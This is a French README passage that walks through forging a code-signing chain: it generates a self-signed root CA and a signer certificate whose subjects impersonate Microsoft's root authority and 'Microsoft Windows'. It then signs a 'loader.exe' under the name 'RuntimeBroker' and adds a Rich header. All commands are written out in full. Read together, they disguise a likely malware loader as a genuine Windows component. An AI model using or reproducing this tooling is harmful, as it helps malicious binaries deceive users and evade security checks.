### Prérequis

```bash
winget install ShiningLight.OpenSSL.Light    # OpenSSL
winget install MichalTrojnara.osslsigncode   # outil de signature PE
```

Ajouter OpenSSL au PATH si nécessaire :
```powershell
$env:PATH += ";C:\Program Files\OpenSSL-Win64\bin"
```

### 1. Configurer les identités

Éditer `tools/codesign.cnf` — sections `[ca_dn]` (CA racine) et `[signer_dn]` (certificat qui signe le binaire).

### 2. Générer les certificats

```bash
python tools/mkcert.py
```

Ce que fait le script (appels OpenSSL) :
```bash
# Clé + certificat CA auto-signé
openssl genrsa -out certs/ca.key 2048
openssl req -new -x509 -key certs/ca.key -out certs/ca.crt -days 3650 -sha256 \
    -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=Microsoft Root Certificate Authority 2011" \
    -config tools/codesign.cnf -extensions v3_ca

# Clé + CSR du signeur
openssl genrsa -out certs/signer.key 2048
openssl req -new -key certs/signer.key -out certs/signer.csr \
    -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=Microsoft Windows" \
    -config tools/codesign.cnf

# Signature du cert par la CA
openssl x509 -req -in certs/signer.csr -CA certs/ca.crt -CAkey certs/ca.key \
    -CAcreateserial -out certs/signer.crt -days 365 -sha256 \
    -extfile tools/codesign.cnf -extensions v3_codesign

# Export PFX
openssl pkcs12 -export -out certs/signer.pfx \
    -inkey certs/signer.key -in certs/signer.crt -certfile certs/ca.crt -passout pass:
```

### 3. Compiler et signer

```bash
make            # compile → build/loader.exe (+ Rich header)
make sign       # signe build/loader.exe
```

Ce que fait `make sign` :
```bash
osslsigncode sign \
    -certs certs/signer.crt \
    -key certs/signer.key \
    -ac certs/ca.crt \
    -h sha256 \
    -n "RuntimeBroker" \
    -in build/loader.exe \
    -out build/loader-signed.exe
mv build/loader-signed.exe build/loader.exe
```

### Fichiers générés dans `certs/` (gitignored)

| Fichier | Contenu |
|---------|---------|
| `ca.key` | Clé privée CA |
| `ca.crt` | Certificat racine auto-signé |
| `signer.key` | Clé privée du signeur |
| `signer.crt` | Certificat code signing (signé par la CA) |
| `signer.pfx` | Bundle PKCS#12 (clé + cert + CA) |